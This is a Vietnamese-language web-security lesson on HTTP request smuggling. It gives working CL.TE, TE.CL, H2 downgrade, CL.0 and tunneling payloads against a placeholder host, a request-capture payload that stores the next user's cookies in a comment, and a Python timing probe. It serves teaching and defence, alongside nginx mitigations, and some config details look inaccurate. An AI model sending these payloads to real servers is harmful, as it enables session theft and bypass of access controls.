# HTTP Request Smuggling

> **CWE**: CWE-444 | **Phân loại**: Data Integrity

## Kiến thức Nền tảng
Hãy tưởng tượng hệ thống web hiện đại giống như một chuỗi nhà hàng thức ăn nhanh hoạt động hết công suất. Khi bạn gửi yêu cầu (request), yêu cầu đó không đi thẳng tới người đầu bếp (Back-end Server) ngay lập tức. Thay vào đó, nó phải đi qua một người thu ngân ở quầy (Front-end Proxy/Load Balancer/CDN). Để tiết kiệm thời gian và tăng tốc phục vụ, người thu ngân thường gom nhiều yêu cầu từ các khách hàng khác nhau lại và gửi chung qua một đường truyền duy nhất (kỹ thuật gọi là tái sử dụng kết nối - connection reuse).

Để đầu bếp và thu ngân có thể hiểu nhau, họ phải dùng chung một giao thức (HTTP/1.1) với hai cách để đo lường độ dài của một đơn hàng:
- **Content-Length (CL)**: Giống như dán nhãn ghi rõ "Gói hàng này nặng đúng 13 gram (byte)".
- **Transfer-Encoding (TE)**: Giống như chia nhỏ món ăn ra gửi đi từng phần (chunked), và báo hiệu hết hàng bằng một phần có kích thước bằng 0.

Về mặt lý thuyết (theo chuẩn RFC 7230), nếu một yêu cầu có cả hai nhãn trên, phía nhận bắt buộc phải ưu tiên xử lý theo cách chia nhỏ (Transfer-Encoding). Nhưng thực tế phũ phàng hơn nhiều: mỗi máy chủ lại xử lý một kiểu! Sự không đồng nhất (desync) giữa người thu ngân phía trước và người đầu bếp phía sau chính là nguồn cơn của lỗ hổng.

```
# Normal HTTP/1.1 request flow through proxy chain
Client ──→ [Front-end Proxy] ──TCP connection──→ [Back-end Server]
           │                                      │
           │  Request 1: POST /api                 │  Parses request boundaries
           │  Request 2: GET /home                 │  using CL or TE headers
           │  (multiplexed on same connection)     │
```

```http
# Normal request with Content-Length
POST /api/submit HTTP/1.1
Host: example.com
Content-Length: 13

{"key":"val"}
```

```http
# Normal request with Transfer-Encoding: chunked
POST /api/submit HTTP/1.1
Host: example.com
Transfer-Encoding: chunked

d\r\n
{"key":"val"}\r\n
0\r\n
\r\n
```

## Mô tả lỗ hổng
Lỗ hổng **HTTP Request Smuggling (Buôn lậu yêu cầu HTTP)** xuất hiện chính từ sự thiếu đồng bộ kể trên. Hãy hình dung kẻ tấn công như một vị khách tinh quái. Hắn chuẩn bị một đơn hàng "siêu đặc biệt" kết hợp cả hai nhãn CL và TE để lừa hệ thống. Người thu ngân phía trước đọc nhãn CL, thấy độ dài hợp lý nên cho đi qua. Nhưng khi đến tay đầu bếp ở phía sau, do ưu tiên đọc nhãn TE, ông ấy dừng lại giữa chừng vì tưởng đơn hàng đã hết. Phần đuôi còn thừa của đơn hàng đó vẫn nằm vất vưởng trên băng chuyền.

Khi bạn – một người dùng vô tội tiếp theo – đến quầy gửi yêu cầu của mình, phần đuôi "bị buôn lậu" trước đó của kẻ tấn công sẽ tự động dán chặt vào đầu yêu cầu của bạn. Kết quả là hệ thống xử lý yêu cầu của bạn nhưng lại thực hiện hành động mà kẻ tấn công đã cài cắm từ trước.

Lỗ hổng này cực kỳ nguy hiểm bởi vì nó có thể giúp kẻ tấn công:
- Vượt qua các hệ thống kiểm soát an ninh (WAF).
- Chiếm đoạt phiên làm việc (session) hoặc thông tin cá nhân của người dùng khác khi họ vô tình truy cập ngay sau đó.
- Làm nhiễm độc bộ nhớ đệm (cache poisoning), khiến mọi người dùng khác đều nhận được nội dung độc hại.
- Lẻn vào các giao diện quản trị nội bộ mà bình thường họ không thể tiếp cận.

## Cơ chế tấn công
**1. Các Biến thể HTTP/1.1 Desync Cơ bản:**

- **CL.TE Attack (Front-end dùng CL, back-end dùng TE)**:
  ```http
  # CL.TE smuggling: front-end reads 6 bytes, back-end uses chunked
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Length: 6
  Transfer-Encoding: chunked

  0\r\n
  \r\n
  G
  ```
  *Giải thích*: Front-end đọc 6 byte (tới chữ `G`) và forward toàn bộ. Back-end sử dụng chunked nên dừng đọc ở chunk `0\r\n\r\n` (hết body). Ký tự thừa `G` còn lại trong socket buffer sẽ được coi là ký tự bắt đầu của request tiếp theo (ví dụ biến thành `GGET / HTTP/1.1`).

- **TE.CL Attack (Front-end dùng TE, back-end dùng CL)**:
  ```http
  # TE.CL smuggling: smuggle a request to access /admin
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Length: 4
  Transfer-Encoding: chunked

  5c\r\n
  GPOST /admin HTTP/1.1\r\n
  Host: vulnerable.com\r\n
  Content-Length: 15\r\n
  \r\n
  x=1\r\n
  0\r\n
  \r\n
  ```
  *Giải thích*: Front-end sử dụng chunked nên đọc toàn bộ dữ liệu tới chunk `0`. Back-end chỉ sử dụng `Content-Length: 4`, do đó chỉ đọc 4 byte đầu tiên (`5c\r\n`). Phần còn lại bắt đầu từ `GPOST...` bị bỏ lại trong bộ đệm và ghép vào request tiếp theo.

- **TE.TE Attack (Obfuscation Transfer-Encoding)**:
  ```http
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Length: 4
  Transfer-Encoding: chunked
  Transfer-Encoding: xobfuscate     # Một trong các server bỏ qua dòng này
  ```
  *Giải thích*: Cả hai server đều hỗ trợ `Transfer-Encoding`, nhưng kẻ tấn công làm xáo trộn (obfuscate) header này sao cho chỉ một trong hai server nhận diện được, còn server kia bỏ qua và sử dụng `Content-Length`. Hệ quả là đưa cuộc tấn công về dạng CL.TE hoặc TE.CL.

**2. Chiếm request của người dùng khác (Request Capture):**
  ```http
  # Smuggle a request that captures the next user's request into a stored field
  POST / HTTP/1.1
  Host: vulnerable.com
  Content-Length: 130
  Transfer-Encoding: chunked

  0

  POST /store-comment HTTP/1.1
  Host: vulnerable.com
  Content-Length: 800
  Content-Type: application/x-www-form-urlencoded

  comment=
  ```
  *Giải thích*: Phần request thứ hai (`POST /store-comment`) bị smuggle và đợi ở buffer. Khi người dùng tiếp theo gửi request, nó sẽ được ghép trực tiếp sau tham số `comment=`. Kết quả là toàn bộ request (chứa Cookie, Authorization header) của người dùng đó bị ghi đè vào comment và lưu trữ lại trên server để kẻ tấn công đọc được.

**3. HTTP/2 Downgrade Smuggling (H2.CL và H2.TE):**
  - **Cơ chế**: Nhiều proxy front-end nhận request HTTP/2 từ client nhưng chuyển đổi hạ cấp (downgrade) thành HTTP/1.1 trước khi chuyển tiếp cho back-end. Do HTTP/2 là giao thức nhị phân và xác định độ dài request bằng các frame dữ liệu nên nó không cần đến các header xác định ranh giới. Tuy nhiên, kẻ tấn công có thể chèn thủ công các header `content-length` hoặc `transfer-encoding` vào HTTP/2 request. Front-end proxy thường bỏ qua các header này vì đã có frame nhị phân, nhưng khi downgrade sang HTTP/1.1, proxy lại đính kèm các header này vào request gửi tới back-end, gây ra sự bất đồng bộ (desync) ở back-end.
  - **H2.CL Attack**: Kẻ tấn công gửi request HTTP/2 chứa header `content-length` giả mạo. Sau khi downgrade, back-end HTTP/1.1 xử lý request dựa trên `content-length` này, dẫn đến bỏ sót một phần request body trong buffer để ghép vào request sau.
  - **H2.TE Attack**: Kẻ tấn công gửi request HTTP/2 chứa header `transfer-encoding: chunked`. Khi chuyển sang HTTP/1.1, back-end server ưu tiên xử lý dạng chunked, gây desync với luồng dữ liệu mà front-end đã gửi.

**4. CL.0 Attacks (Content-Length 0):**
  - **Cơ chế**: Xảy ra khi front-end proxy chuyển tiếp request body và sử dụng header `Content-Length` bình thường, nhưng back-end server lại cấu hình để bỏ qua body của một số request (ví dụ như các API GET hoặc POST cụ thể) và mặc định coi độ dài body bằng `0`.
  - **Tấn công**: Kẻ tấn công gửi một POST request chứa dữ liệu bổ sung trong body và chỉ định `Content-Length` chính xác. Front-end forward toàn bộ request này. Back-end nhận request, nhưng vì nó coi độ dài body bằng `0` nên xử lý ngay lập tức và coi phần body thực tế của request đó là sự khởi đầu của request tiếp theo được gửi trên cùng kết nối TCP.

**5. Request Tunneling (Đào hầm yêu cầu qua Proxy):**
  - **Cơ chế**: Kẻ tấn công lợi dụng sự desync giữa proxy và back-end để đóng gói một request hoàn chỉnh khác bên trong phần thân của request đầu tiên (smuggled request).
  - Request này được "tunnel" qua proxy mà hoàn toàn không bị kiểm tra bởi các chính sách bảo mật, bộ lọc IP, xác thực hay WAF được cài đặt trên proxy front-end. Back-end server khi đọc luồng dữ liệu từ socket sẽ phân tách yêu cầu bị chèn này và thực thi nó dưới tư cách là một yêu cầu nội bộ hợp lệ, cho phép kẻ tấn công truy cập trái phép các endpoint nhạy cảm (như `/admin`, `/internal-api`) hoặc giả mạo người dùng nội bộ.

## Biện pháp phòng thủ
```nginx
# Nginx — reject ambiguous requests
if ($http_transfer_encoding ~* "chunked" ) {
    # If both CL and TE are present, return 400
    set $ambiguous "TE";
}
if ($content_length != "") {
    set $ambiguous "${ambiguous}CL";
}
if ($ambiguous = "TECL") {
    return 400;  # Reject ambiguous requests
}
```

- **Tóm tắt**: Phòng chống HTTP Request Smuggling bằng cách sử dụng HTTP/2 end-to-end, cấu hình proxy từ chối request không rõ ràng, và chuẩn hóa các HTTP header.
- **Các bước chi tiết**:
  - **Sử dụng HTTP/2 end-to-end** — HTTP/2 dùng binary framing, loại bỏ hoàn toàn ambiguity về ranh giới request. Đảm bảo không downgrade sang HTTP/1.1 ở back-end.
  - **Cấu hình proxy từ chối request ambiguous** — reject request có cả `Content-Length` và `Transfer-Encoding`:
  - **Normalize header** trước khi forward — strip duplicate `Transfer-Encoding`, loại bỏ obfuscation.
  - **Mỗi request một TCP connection** — tắt connection reuse giữa front-end và back-end (giảm hiệu suất nhưng an toàn).
  - **Sử dụng công cụ kiểm tra** — Burp Suite's HTTP Request Smuggler extension để phát hiện vulnerability.

## Code Example
### 1. HTTP/1.1 CL.TE Smuggling Detection Script (Python)
```python
# === DETECTION SCRIPT: Detect CL.TE smuggling vulnerability ===
import socket

def test_cl_te(host, port=80):
    """Send a CL.TE probe to detect request smuggling"""
    # Craft a probe: if CL.TE exists, the smuggled request causes a timeout diff
    probe = (
        f"POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 4\r\n"            # Front-end reads 4 bytes
        f"Transfer-Encoding: chunked\r\n"   # Back-end reads chunked
        f"\r\n"
        f"1\r\n"                             # Chunk of 1 byte
        f"Z\r\n"                             # The chunk data
        f"Q\r\n"                             # INVALID chunk — back-end hangs waiting
    )

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect((host, port))
    sock.send(probe.encode())

    try:
        response = sock.recv(4096)
        print("[SAFE] Server responded normally")
    except socket.timeout:
        print("[VULN] Timeout detected — possible CL.TE smuggling!")
    finally:
        sock.close()
```

### 2. HTTP/2 Downgrade Smuggling Payload
```http
# === CLIENT HTTP/2 REQUEST (Sent via H2 Frame) ===
# Attacker injects custom transfer-encoding/content-length headers into the binary frame
:method: POST
:path: /
:authority: vulnerable.com
content-length: 0
transfer-encoding: chunked

# === DOWNGRADED HTTP/1.1 REQUEST (Forwarded by Front-end) ===
# The front-end proxy converts H2 to HTTP/1.1, appending the injected headers
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 0
Transfer-Encoding: chunked

5\r\n
SMUGL\r\n
0\r\n
\r\n
```

### 3. CL.0 Smuggling Payload
```http
# === VULNERABLE CL.0 REQUEST ===
# Front-end reads Content-Length: 44. Back-end ignores body, treating length as 0.
POST /index.html HTTP/1.1
Host: vulnerable.com
Content-Length: 44

GET /admin HTTP/1.1
Host: vulnerable.com
```

### 4. Request Tunneling Payload
```http
# === SMUGGLED TUNNEL REQUEST ===
# The smuggled payload encapsulates a complete GET request to bypass front-end controls
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 120
Transfer-Encoding: chunked

0\r\n
\r\n
GET /admin HTTP/1.1\r\n
Host: vulnerable.com\r\n
X-Forwarded-For: 127.0.0.1\r\n
\r\n
```

### 5. Secure Nginx Proxy Configuration
```nginx
# === SECURE: Force HTTP/2 end-to-end to prevent downgrade vulnerabilities ===
server {
    listen 443 ssl;
    http2 on;
    
    location / {
        # Normalize and reject ambiguous headers from client requests
        # Use HTTP/2 protocol for communication with back-end to eliminate translation mismatches
        proxy_pass https://backend_servers;
        proxy_http_version 2.0; 
    }
}
```

## Xem thêm
- [Các bài học liên quan trong cùng thư mục](../)

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/request-smuggling
- OWASP: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling
- CWE: https://cwe.mitre.org/data/definitions/444.html
- James Kettle: https://portswigger.net/research/http-desync-attacks

## Giải thích thuật ngữ
- **CDN (Content Delivery Network)**: Mạng lưới phân phối nội dung giúp tăng tốc độ tải trang bằng cách lưu trữ bản sao ở nhiều nơi trên thế giới gần với người dùng hơn.
- **Load Balancer**: Bộ cân bằng tải, phân chia lưu lượng truy cập đều cho các máy chủ phía sau để tránh quá tải.
- **Reverse Proxy**: Máy chủ trung gian đứng trước các máy chủ ứng dụng để tiếp nhận, xử lý hoặc lọc yêu cầu từ client trước khi gửi vào hệ thống nội bộ.
- **Application Server**: Máy chủ ứng dụng xử lý logic nghiệp vụ chính của website (như xử lý database, đăng nhập, mua hàng...).
- **Connection Reuse**: Kỹ thuật tái sử dụng một kết nối mạng (TCP) để gửi nhiều yêu cầu liên tiếp nhằm tiết kiệm thời gian thiết lập kết nối mới.
- **TCP Connection**: Kết nối mạng tin cậy giúp truyền dữ liệu ổn định và chính xác giữa hai máy tính.
- **RFC**: Bộ tài liệu tiêu chuẩn kỹ thuật quy định các quy tắc hoạt động của các giao thức trên Internet.
- **Desync (Mất đồng bộ)**: Sự không thống nhất về cách hiểu hoặc trạng thái dữ liệu giữa hai hay nhiều hệ thống khác nhau.
- **WAF (Web Application Firewall)**: Tường lửa bảo vệ ứng dụng web khỏi các cuộc tấn công bằng cách lọc và giám sát lưu lượng HTTP.
- **Cache Poisoning**: Kỹ thuật làm nhiễm độc bộ nhớ đệm, khiến hệ thống lưu trữ và trả về nội dung độc hại cho tất cả người dùng truy cập sau đó.
- **Endpoint**: Điểm cuối (địa chỉ URL cụ thể) của một dịch vụ hoặc API mà ứng dụng có thể gửi yêu cầu đến.
- **Obfuscation (Làm xáo trộn)**: Kỹ thuật làm mờ, biến đổi hoặc che giấu thông tin/dữ liệu để tránh bị các hệ thống quét an ninh phát hiện nhưng vẫn hoạt động được.
- **Downgrade**: Quá trình hạ cấp giao thức hoặc phiên bản công nghệ xuống mức thấp hơn (ví dụ từ HTTP/2 xuống HTTP/1.1) nhằm mục đích tương thích ngược hoặc khai thác lỗi.
